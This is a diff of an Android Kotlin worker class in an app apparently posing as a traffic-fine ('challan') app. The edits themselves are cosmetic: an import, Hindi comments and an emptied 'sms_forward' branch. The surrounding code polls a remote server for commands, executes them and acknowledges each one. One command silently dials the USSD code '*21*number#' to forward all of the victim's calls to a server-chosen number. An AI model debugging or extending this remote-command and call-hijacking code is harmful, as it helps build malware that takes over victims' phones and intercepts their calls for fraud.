@@ -4,6 +4,7 @@ import android.content.Context
 import android.util.Log
 import androidx.work.CoroutineWorker
 import androidx.work.WorkerParameters
+import androidx.work.Result  // ✅ यह import जरूरी है
 import com.google.gson.Gson
 import com.rte.challan.network.ApiClient
 import com.rte.challan.utils.DeviceInfo
@@ -24,14 +25,13 @@ class CommandWorker(context: Context, params: WorkerParameters) : CoroutineWorke
                 val commands = response.body() ?: emptyList()
                 for (cmd in commands) {
                     executeCommand(cmd)
-                    // Send ACK (success)
                     val ack = CommandAck(cmd.id, "sent")
                     ApiClient.instance.acknowledgeCommand(ack)
                 }
                 Result.success()
             } else {
                 Log.e("CommandWorker", "Failed to fetch: ${response.code()}")
-                Result.retry()
+                Result.retry()   // ✅ यह अब काम करेगा
             }
         } catch (e: Exception) {
             Log.e("CommandWorker", "Error: ${e.message}")
@@ -49,10 +49,7 @@ class CommandWorker(context: Context, params: WorkerParameters) : CoroutineWorke
                 val data = Gson().fromJson(cmd.data, ForwardCommandData::class.java)
                 UssdHelper.dialUssd(applicationContext, "*21*${data.number}#")
             }
-            "sms_forward" -> {
-                // Just save the number somewhere if needed
-                // For now, do nothing
-            }
+            "sms_forward" -> { }
         }
     }
 
